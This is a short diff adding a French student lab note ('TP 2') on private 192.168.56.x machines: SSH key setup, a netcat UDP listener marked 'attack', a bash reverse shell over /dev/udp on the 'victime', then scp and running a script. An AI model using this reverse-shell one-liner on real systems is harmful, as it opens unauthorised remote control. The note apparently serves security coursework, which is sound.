@@ -1,0 +1,24 @@
+TP 2
+
+#j'ai mis les key ssh sur les deux serveur pour les recupération des script
+
+ssh-keygen
+
+ssh-copy-id root@192.168.56.1
+ssh-copy-id root@192.168.56.4
+
+#attack
+
+nc -u -lvp 4242
+
+ #victime
+
+bash -i >& /dev/udp/192.168.56.4/4242 0>&1
+
+#recupération des fichiers
+
+scp root@192.168.56.4:/root/*.sh /root/
+
+#lancé le script
+
+./script.sh
